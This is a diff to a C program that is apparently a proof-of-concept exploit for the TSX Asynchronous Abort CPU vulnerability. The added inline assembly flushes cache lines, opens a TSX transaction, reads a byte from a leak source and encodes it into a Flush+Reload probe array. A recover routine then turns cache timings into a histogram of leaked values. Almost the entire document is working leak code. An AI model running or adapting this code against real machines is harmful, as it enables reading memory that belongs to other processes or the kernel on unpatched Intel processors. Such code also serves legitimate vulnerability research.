@@ -19,6 +19,10 @@ volatile long long not_aborted = 0;
 volatile int temp_cnter = 0;
 #define CNTER_LIMIT 1000
 void recover(void);
+volatile bool abort_flag = 0;
+
+#define ASSEMBLY
+
 int main(int argc, char *argv[])
 {
   if(!has_tsx()) {
@@ -40,11 +44,36 @@ int main(int argc, char *argv[])
   fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (unsigned int)CACHE_MISS);
 
   while (true) {
-    /* Flush mapping */
-    flush(mapping);
-#if 1
-    /* Begin transaction and recover value */
-    if(xbegin() != (0u)) {
+
+#ifdef ASSEMBLY
+	    __asm__ __volatile__ (
+	    		 	 	 	  "movq %3, %%rdi;"
+	    					  "clflush (%%rdi);"
+							  "movq %4, %%rsi;"
+							  "clflush (%%rsi);"
+	    					  "xbegin abort;"
+	    					  "movq (%%rdi), %%rax;"
+	    					  "shl $12, %%rax;"
+	    					  "andq $0xff000, %%rax;"
+	    					  "movq (%%rax, %%rsi), %%rax;"
+	    					  "xend;"
+							  "movq %1, %%rcx;"
+	  	  	  	  	  	  	  "incq %%rcx;"
+							  "movq %%rcx, %1;"
+							  "abort:"
+							  "movq %2, %%rdx;"
+				  	  	  	  "incq %%rdx;"
+							  "movq %%rdx, %2;"
+	    					  "movq $1, %0"
+	    					  : "=g"(abort_flag), "=g"(aborted), "=g"(not_aborted) : "r" (mapping), "r" (mem), "r"(aborted), "r"(not_aborted) : "rcx", "rdx"
+	    );
+
+#else
+	/* Flush mapping */
+	flush(mapping);
+
+	/* Begin transaction and recover value */
+    if(xbegin() == ~(0u)) {
 
 	 /*
 	  * Reference: Intel Deep Dive TSX
@@ -80,51 +109,25 @@ int main(int argc, char *argv[])
     else {
         ++ aborted;
     }
-#else
-
-//    ; %rdi = leak source
-//    ; %rsi = FLUSH + RELOAD channel
-//    taa_sample:
-//    ; Cause TSX to abort asynchronously.
-//    clflush (%rdi)
-//    clflush (%rsi)
-//
-//    ; Leak a single byte.
-//    xbegin abort
-//    movq (%rdi), %rax
-//    shl $12, %rax
-//    andq $0xff000, %rax
-//    movq (%rax, %rsi), %rax
-//    xend
-//    abort:
-//    retq
-    __asm__ __volatile__ ( "movl %1, %%eax;"
-                          "movl %2, %%ebx;"
-                          "CONTD: cmpl $0, %%ebx;"
-                          "je DONE;"
-                          "xorl %%edx, %%edx;"
-                          "idivl %%ebx;"
-                          "movl %%ebx, %%eax;"
-                          "movl %%edx, %%ebx;"
-                          "jmp CONTD;"
-                          "DONE: movl %%eax, %0;" : "=g" (result) : "g" (a), "g" (b)
-    );
-
 #endif
-    
+
+#ifdef ASSEMBLY
+    if (abort_flag) {
+    	abort_flag = 0;
+    	recover();
+    }
+#else
     /* Recover through probe mem array */
     recover();
+#endif
 
-    if (++temp_cnter < CNTER_LIMIT) {
-    	printf("Aborted Count => %lld\n", aborted);
-    	printf("Not-Aborted Count => %lld\n", not_aborted);
-    }
   }
 
   return 0;
 }
 
 int timeout = 0;
+volatile long long not_update = 0;
 void recover(void) {
 
     /* Recover value from cache and update histogram */
@@ -135,9 +138,10 @@ void recover(void) {
         update = true;
       }
     }
-#if 1
     /* Redraw histogram on update */
-    if (update == true) {
+    if (update == true /*|| (++not_update > 1000000)*/)
+    {
+    	not_update = 0;
         printf("\x1b[2J");
 
         int max = 1;
@@ -159,9 +163,10 @@ void recover(void) {
 				}
 				printf("\n");
 			}
+			printf("Aborted_Count: %lld\n", aborted);
+			printf("Not_Aborted_Count: %lld\n", not_aborted);
 
 			fflush(stdout);
         }
     }
-#endif
 }
